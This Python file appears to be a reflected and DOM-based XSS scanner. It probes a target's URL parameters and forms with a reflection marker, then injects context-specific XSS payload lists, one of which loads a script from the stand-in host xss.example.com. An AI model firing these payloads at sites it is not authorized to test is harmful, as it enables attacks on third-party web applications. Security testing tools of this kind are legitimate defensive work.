#!/usr/bin/env python3
import httpx
import urllib.parse
from typing import List, Dict, Set
import re
import secrets
from html.parser import HTMLParser

# Common XSS payloads to test
BASE_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>alert(document.domain)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
]

CONTEXTUAL_PAYLOADS = {
    'html': [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=alert('XSS')>",
    ],
    'attribute': [
        "\" onmouseover=alert('XSS') x=\"",
        "' onfocus=alert('XSS') x='",
        "\" autofocus onfocus=alert('XSS') x=\"",
    ],
    'javascript': [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "</script><script>alert('XSS')</script>",
    ],
    'url': [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
    ],
    'css': [
        "</style><script>alert('XSS')</script>",
        "background-image:url(javascript:alert('XSS'))",
    ],
}

class FormParser(HTMLParser):
    """Parse HTML to extract forms and their inputs"""
    
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.current_input = None
    
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'get').upper(),
                'inputs': []
            }
        
        elif tag in ['input', 'textarea', 'select'] and self.current_form is not None:
            input_data = {
                'type': attrs_dict.get('type', 'text'),
                'name': attrs_dict.get('name', ''),
                'value': attrs_dict.get('value', '')
            }
            if input_data['name']:  # Only add inputs with names
                self.current_form['inputs'].append(input_data)
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None

def log(msg, level='INFO'):
    """Simple logging function"""
    print(f'[{level}] {msg}')

def extract_forms(html_content: str) -> List[Dict]:
    """Extract all forms from HTML content"""
    parser = FormParser()
    try:
        parser.feed(html_content)
    except Exception as e:
        log(f'Error parsing HTML forms: {str(e)}', 'DEBUG')
    return parser.forms

def generate_marker() -> str:
    """Generate a unique marker for reflection testing."""
    return f"xss{secrets.token_hex(4)}"

def detect_reflection_contexts(response_text: str, marker: str) -> Set[str]:
    """Detect contexts in which a marker is reflected in the response."""
    contexts: Set[str] = set()
    if marker not in response_text:
        return contexts

    marker_pattern = re.escape(marker)
    for match in re.finditer(marker_pattern, response_text):
        start = max(0, match.start() - 150)
        end = min(len(response_text), match.end() + 150)
        snippet = response_text[start:end]

        if re.search(r'<script[^>]*>.*?' + marker_pattern, snippet, re.IGNORECASE | re.DOTALL):
            contexts.add('javascript')
            continue

        if re.search(r'on\w+\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
            contexts.add('javascript')
            continue

        if re.search(r'<[^>]+\s+[^>]*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
            contexts.add('attribute')
            continue

        if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
            contexts.add('url')
            continue

        if re.search(r'<style[^>]*>.*?' + marker_pattern, snippet, re.IGNORECASE | re.DOTALL):
            contexts.add('css')
            continue

        if re.search(r'style\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
            contexts.add('css')
            continue

        contexts.add('html')

    return contexts

def select_payloads_for_contexts(contexts: Set[str]) -> List[str]:
    """Select payloads based on reflection contexts, with fallback coverage."""
    payloads = []
    for context in contexts:
        payloads.extend(CONTEXTUAL_PAYLOADS.get(context, []))

    if not payloads:
        payloads = BASE_XSS_PAYLOADS.copy()

    # Ensure base payloads are always included for coverage
    for payload in BASE_XSS_PAYLOADS:
        if payload not in payloads:
            payloads.append(payload)

    return payloads

def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Test for reflected XSS vulnerabilities by injecting payloads into URL parameters and forms.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            # First, get the page to extract forms
            initial_response = client.get(url)
            forms = extract_forms(initial_response.text)
            
            # Parse URL to extract query parameters
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Test URL parameters (GET)
            if not params:
                # If no parameters in URL, try common parameter names
                common_params = ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
                params = {param: ['test'] for param in common_params}
            
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test GET parameters
            for param_name in params.keys():
                log(f'Testing XSS on GET parameter: {param_name}', 'INFO')
                marker = generate_marker()
                test_params = params.copy()
                test_params[param_name] = [marker]
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}

                try:
                    response = client.get(base_url, params=flat_params)
                    contexts = detect_reflection_contexts(response.text, marker)
                except httpx.TimeoutException:
                    log(f'Timeout testing {param_name}', 'WARN')
                    continue
                except Exception as e:
                    log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
                    continue

                if not contexts:
                    log(f'No reflection detected for {param_name}, skipping payloads', 'DEBUG')
                    continue

                payloads = select_payloads_for_contexts(contexts)

                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    
                    try:
                        response = client.get(base_url, params=flat_params)
                        
                        if payload in response.text:
                            if is_xss_vulnerable(response.text, payload):
                                vuln = {
                                    'type': 'reflected_xss',
                                    'method': 'GET',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': str(response.url),
                                    'severity': 'high',
                                    'description': f'Reflected XSS found in GET parameter "{param_name}"'
                                }
                                vulnerabilities.append(vuln)
                                log(f'XSS FOUND: GET parameter {param_name} with payload: {payload[:50]}...', 'VULN')
                                break
                    
                    except httpx.TimeoutException:
                        log(f'Timeout testing {param_name}', 'WARN')
                        break
                    except Exception as e:
                        log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
                        continue
            
            # Test forms (POST/GET based on form method)
            if forms:
                log(f'Found {len(forms)} form(s) to test', 'INFO')
                
                for form_idx, form in enumerate(forms):
                    if not form['inputs']:
                        continue
                    
                    form_action = form['action']
                    # Resolve relative form action URLs
                    if form_action:
                        form_url = urllib.parse.urljoin(url, form_action)
                    else:
                        form_url = url
                    
                    log(f'Testing form {form_idx + 1} ({form["method"]}) with {len(form["inputs"])} input(s)', 'INFO')
                    
                    # Test each input field in the form
                    for input_field in form['inputs']:
                        if input_field['type'] in ['submit', 'button', 'image']:
                            continue  # Skip non-data inputs
                        
                        field_name = input_field['name']
                        log(f'Testing form input: {field_name}', 'INFO')
                        
                        marker = generate_marker()
                        probe_data = {}
                        for inp in form['inputs']:
                            if inp['name'] == field_name:
                                probe_data[inp['name']] = marker
                            else:
                                probe_data[inp['name']] = inp['value'] or 'test'

                        try:
                            if form['method'] == 'POST':
                                probe_response = client.post(form_url, data=probe_data)
                            else:
                                probe_response = client.get(form_url, params=probe_data)
                            contexts = detect_reflection_contexts(probe_response.text, marker)
                        except httpx.TimeoutException:
                            log(f'Timeout testing form input {field_name}', 'WARN')
                            continue
                        except Exception as e:
                            log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
                            continue

                        if not contexts:
                            log(f'No reflection detected for form input {field_name}, skipping payloads', 'DEBUG')
                            continue

                        payloads = select_payloads_for_contexts(contexts)

                        for payload in payloads:
                            # Build form data with payload in the tested field
                            form_data = {}
                            for inp in form['inputs']:
                                if inp['name'] == field_name:
                                    form_data[inp['name']] = payload
                                else:
                                    form_data[inp['name']] = inp['value'] or 'test'
                            
                            try:
                                if form['method'] == 'POST':
                                    response = client.post(form_url, data=form_data)
                                else:
                                    response = client.get(form_url, params=form_data)
                                
                                if payload in response.text:
                                    if is_xss_vulnerable(response.text, payload):
                                        vuln = {
                                            'type': 'reflected_xss',
                                            'method': form['method'],
                                            'parameter': field_name,
                                            'payload': payload,
                                            'url': form_url,
                                            'severity': 'high',
                                            'description': f'Reflected XSS found in {form["method"]} form input "{field_name}"'
                                        }
                                        vulnerabilities.append(vuln)
                                        log(f'XSS FOUND: {form["method"]} form input {field_name} with payload: {payload[:50]}...', 'VULN')
                                        break
                            
                            except httpx.TimeoutException:
                                log(f'Timeout testing form input {field_name}', 'WARN')
                                break
                            except Exception as e:
                                log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
                                continue
    
    except Exception as e:
        log(f'XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def test_dom_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Test for potential DOM-based XSS by looking for dangerous JavaScript patterns.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    found_patterns = set()  # Track which patterns we've already reported
    
    # Dangerous JavaScript patterns that could lead to DOM XSS
    dangerous_patterns = [
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'eval\s*\(',
        r'setTimeout\s*\(',
        r'setInterval\s*\(',
        r'Function\s*\(',
        r'location\.href\s*=',
        r'location\.replace\s*\(',
        r'location\.assign\s*\(',
    ]
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            response = client.get(url)
            
            for pattern in dangerous_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE)
                match_count = 0
                first_context = None
                
                for match in matches:
                    match_count += 1
                    # Only store the first match context
                    if first_context is None:
                        start = max(0, match.start() - 50)
                        end = min(len(response.text), match.end() + 50)
                        first_context = response.text[start:end].replace('\n', ' ')
                
                # Only report this pattern once, even if found multiple times
                if match_count > 0 and pattern not in found_patterns:
                    found_patterns.add(pattern)
                    
                    # Include count in description if multiple instances found
                    if match_count > 1:
                        description = f'Potentially dangerous JavaScript pattern found ({match_count} instances): {pattern}'
                    else:
                        description = f'Potentially dangerous JavaScript pattern found: {pattern}'
                    
                    vuln = {
                        'type': 'potential_dom_xss',
                        'pattern': pattern,
                        'count': match_count,
                        'context': first_context,
                        'severity': 'medium',
                        'description': description
                    }
                    vulnerabilities.append(vuln)
                    log(f'DOM XSS pattern: {pattern} ({match_count} instance{"s" if match_count > 1 else ""})', 'VULN')
    
    except Exception as e:
        log(f'DOM XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def is_xss_vulnerable(response_text: str, payload: str) -> bool:
    """
    Check if the response indicates a potential XSS vulnerability.
    
    Args:
        response_text: HTML response text
        payload: The XSS payload that was injected
    
    Returns:
        bool: True if potentially vulnerable, False otherwise
    """
    if payload not in response_text:
        return False

    payload_index = response_text.find(payload)
    if payload_index == -1:
        return False

    context_start = max(0, payload_index - 30)
    context_end = min(len(response_text), payload_index + len(payload) + 30)
    context = response_text[context_start:context_end]

    encoded_chars = ['&lt;', '&gt;', '&quot;', '&#', '&amp;']
    if any(char in context for char in encoded_chars) and any(ch in payload for ch in ['<', '>', '"', "'"]):
        return False

    payload_pattern = re.escape(payload)
    contexts = set()

    if re.search(r'<script[^>]*>.*?' + payload_pattern, response_text, re.IGNORECASE | re.DOTALL):
        contexts.add('javascript')
    if re.search(r'on\w+\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
        contexts.add('javascript')
    if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
        contexts.add('url')
    if re.search(r'style\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
        contexts.add('css')
    if re.search(r'<[^>]+\s+[^>]*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
        contexts.add('attribute')
    if re.search(r'>' + payload_pattern + r'<', response_text):
        contexts.add('html')

    if contexts:
        return True

    if any(keyword in payload.lower() for keyword in ['<script', 'onerror', 'onload', 'javascript:']):
        return True

    return False

def check_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Main XSS checking function that runs all XSS tests.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing all XSS vulnerabilities found
    """
    log(f'Running XSS scanner on {url}', 'INFO')
    
    all_vulnerabilities = []
    
    # Test for reflected XSS (GET params and forms)
    reflected_vulns = test_reflected_xss(url, timeout)
    all_vulnerabilities.extend(reflected_vulns)
    
    # Test for DOM-based XSS patterns
    dom_vulns = test_dom_xss(url, timeout)
    all_vulnerabilities.extend(dom_vulns)
    
    if all_vulnerabilities:
        log(f'Found {len(all_vulnerabilities)} XSS vulnerability(ies) on {url}', 'VULN')
    else:
        log(f'No XSS vulnerabilities found on {url}', 'INFO')
    
    return all_vulnerabilities
